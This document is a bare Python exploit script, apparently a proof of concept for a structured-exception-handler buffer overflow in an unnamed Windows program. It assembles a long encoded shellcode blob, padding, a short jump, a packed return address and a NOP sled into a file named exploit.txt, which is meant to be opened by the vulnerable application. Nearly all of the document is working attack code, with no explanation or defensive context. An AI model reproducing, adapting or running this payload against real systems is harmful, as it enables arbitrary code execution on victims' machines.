#!/usr/bin/python
import struct

shellcode = "\x89\xe3\xda\xce\xd9\x73\xf4\x58\x50\x59\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
shellcode += "\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
shellcode += "\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
shellcode += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
shellcode += "\x69\x6c\x6b\x58\x6c\x42\x65\x50\x73\x30\x73\x30"
shellcode += "\x45\x30\x6c\x49\x59\x75\x46\x51\x6f\x30\x65\x34"
shellcode += "\x4c\x4b\x36\x30\x70\x30\x4c\x4b\x36\x32\x66\x6c"
shellcode += "\x6e\x6b\x50\x52\x37\x64\x6e\x6b\x73\x42\x51\x38"
shellcode += "\x44\x4f\x48\x37\x43\x7a\x36\x46\x34\x71\x6b\x4f"
shellcode += "\x6e\x4c\x45\x6c\x65\x31\x43\x4c\x46\x62\x66\x4c"
shellcode += "\x55\x70\x6a\x61\x48\x4f\x54\x4d\x36\x61\x6b\x77"
shellcode += "\x49\x72\x7a\x52\x52\x72\x31\x47\x4c\x4b\x32\x72"
shellcode += "\x36\x70\x6e\x6b\x53\x7a\x35\x6c\x6c\x4b\x52\x6c"
shellcode += "\x57\x61\x61\x68\x6d\x33\x67\x38\x67\x71\x7a\x71"
shellcode += "\x33\x61\x4c\x4b\x52\x79\x75\x70\x73\x31\x5a\x73"
shellcode += "\x4c\x4b\x73\x79\x65\x48\x6d\x33\x77\x4a\x33\x79"
shellcode += "\x6e\x6b\x35\x64\x6c\x4b\x63\x31\x49\x46\x54\x71"
shellcode += "\x69\x6f\x4e\x4c\x5a\x61\x6a\x6f\x56\x6d\x65\x51"
shellcode += "\x69\x57\x76\x58\x59\x70\x54\x35\x4b\x46\x76\x63"
shellcode += "\x51\x6d\x69\x68\x57\x4b\x33\x4d\x51\x34\x63\x45"
shellcode += "\x38\x64\x36\x38\x6c\x4b\x36\x38\x77\x54\x36\x61"
shellcode += "\x6a\x73\x65\x36\x4c\x4b\x76\x6c\x72\x6b\x6e\x6b"
shellcode += "\x32\x78\x67\x6c\x37\x71\x4a\x73\x4e\x6b\x46\x64"
shellcode += "\x6e\x6b\x55\x51\x78\x50\x6b\x39\x72\x64\x54\x64"
shellcode += "\x67\x54\x53\x6b\x53\x6b\x65\x31\x76\x39\x31\x4a"
shellcode += "\x33\x61\x79\x6f\x4d\x30\x53\x6f\x43\x6f\x43\x6a"
shellcode += "\x4c\x4b\x74\x52\x6a\x4b\x4e\x6d\x63\x6d\x71\x78"
shellcode += "\x45\x63\x46\x52\x35\x50\x43\x30\x73\x58\x30\x77"
shellcode += "\x51\x63\x34\x72\x31\x4f\x32\x74\x42\x48\x42\x6c"
shellcode += "\x32\x57\x55\x76\x47\x77\x4e\x69\x68\x68\x69\x6f"
shellcode += "\x6a\x70\x6f\x48\x6e\x70\x53\x31\x37\x70\x33\x30"
shellcode += "\x36\x49\x6a\x64\x30\x54\x32\x70\x75\x38\x31\x39"
shellcode += "\x6d\x50\x42\x4b\x65\x50\x69\x6f\x6a\x75\x52\x4a"
shellcode += "\x66\x6a\x45\x38\x59\x50\x39\x38\x37\x71\x6d\x51"
shellcode += "\x42\x48\x65\x52\x35\x50\x57\x66\x4e\x48\x4b\x39"
shellcode += "\x59\x76\x56\x30\x66\x30\x76\x30\x76\x30\x57\x30"
shellcode += "\x72\x70\x57\x30\x70\x50\x63\x58\x6b\x5a\x46\x6f"
shellcode += "\x49\x4f\x4d\x30\x6b\x4f\x5a\x75\x6d\x47\x72\x4a"
shellcode += "\x72\x30\x52\x76\x70\x57\x52\x48\x4f\x69\x49\x35"
shellcode += "\x44\x34\x33\x51\x49\x6f\x49\x45\x6d\x55\x4f\x30"
shellcode += "\x51\x64\x54\x4a\x79\x6f\x30\x4e\x33\x38\x30\x75"
shellcode += "\x4a\x4c\x5a\x48\x31\x77\x57\x70\x45\x50\x57\x70"
shellcode += "\x63\x5a\x63\x30\x31\x7a\x56\x64\x30\x56\x71\x47"
shellcode += "\x63\x58\x34\x42\x68\x59\x48\x48\x33\x6f\x69\x6f"
shellcode += "\x58\x55\x6c\x43\x6b\x48\x77\x70\x73\x4e\x57\x46"
shellcode += "\x6e\x6b\x65\x66\x50\x6a\x73\x70\x43\x58\x63\x30"
shellcode += "\x72\x30\x65\x50\x37\x70\x53\x66\x62\x4a\x45\x50"
shellcode += "\x72\x48\x42\x78\x79\x34\x51\x43\x4a\x45\x69\x6f"
shellcode += "\x4b\x65\x6f\x63\x31\x43\x72\x4a\x57\x70\x52\x76"
shellcode += "\x33\x63\x63\x67\x45\x38\x67\x72\x38\x59\x79\x58"
shellcode += "\x51\x4f\x4b\x4f\x79\x45\x6b\x33\x4b\x48\x57\x70"
shellcode += "\x51\x6d\x37\x58\x62\x78\x62\x48\x47\x70\x37\x30"
shellcode += "\x67\x70\x77\x70\x51\x7a\x43\x30\x70\x50\x72\x48"
shellcode += "\x66\x6b\x74\x6f\x64\x4f\x66\x50\x6b\x4f\x4b\x65"
shellcode += "\x52\x77\x55\x38\x50\x75\x32\x4e\x70\x4d\x31\x71"
shellcode += "\x79\x6f\x7a\x75\x33\x6e\x31\x4e\x4b\x4f\x64\x4c"
shellcode += "\x55\x74\x76\x6f\x4f\x75\x42\x50\x39\x6f\x69\x6f"
shellcode += "\x59\x6f\x59\x79\x4d\x4b\x4b\x4f\x39\x6f\x59\x6f"
shellcode += "\x37\x71\x49\x53\x66\x49\x6b\x76\x32\x55\x6a\x61"
shellcode += "\x68\x43\x6f\x4b\x58\x70\x58\x35\x6d\x72\x70\x56"
shellcode += "\x62\x4a\x43\x30\x50\x53\x79\x6f\x4a\x75\x41\x41"

payload = "A"*996
payload += "BB\x77\x08"
payload += struct.pack("<I",0x1001e2e3)
payload += "\x90"*10
payload += shellcode
payload += "A"*(3000-len(payload))

with open('exploit.txt', 'w') as TxtFile:
    TxtFile.write(payload)
